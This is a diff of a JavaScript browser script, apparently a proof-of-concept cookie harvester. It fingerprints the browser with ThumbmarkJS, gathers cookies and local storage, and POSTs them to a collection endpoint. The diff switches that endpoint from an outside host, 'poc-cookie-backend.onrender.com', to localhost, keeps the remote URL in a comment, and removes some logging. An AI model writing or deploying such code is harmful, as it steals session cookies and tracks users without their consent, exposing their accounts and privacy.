@@ -57,9 +57,7 @@ if (localStorage.getItem("**profileId")) {
 
 async function generateFingerprint() {
     try {
-        const fingerprint = await ThumbmarkJS.getFingerprint();
-        console.log("Generated Fingerprint:", fingerprint);
-        return fingerprint;
+        return await ThumbmarkJS.getFingerprint();
     } catch (error) {
         console.error("Error generating fingerprint:", error);
     }
@@ -85,14 +83,10 @@ const complimentCookie = () => {
  * Sends collected data (cookies, local storage, etc.) to a remote server.
  */
 const logData = async () => {
-    // Extract cookies from the document.
-    const data = complimentCookie();
-    void data; // This is likely a placeholder to avoid linting errors; consider removing if not needed.
-    console.log("Fingerprint: ", await generateFingerprint())
     // Send the data via a POST request to the specified URL.
     await fetch(
-        //"http://localhost:50000/api/v1/data", // Replace with the actual URL of your server.
-         "https://poc-cookie-backend.onrender.com/api/v1/data", //Alternative url
+        "http://localhost:50000/api/v1/data", // Replace with the actual URL of your server.
+        // "https://poc-cookie-backend.onrender.com/api/v1/data", //Alternative url
         {
             method: "POST",
             headers: {
@@ -137,7 +131,6 @@ const processNode = (node) => {
             blurElement(parent)
         }
     }
-    // console.log(document.cookie); // Commented out logging of the cookies.
 }
 
 /**
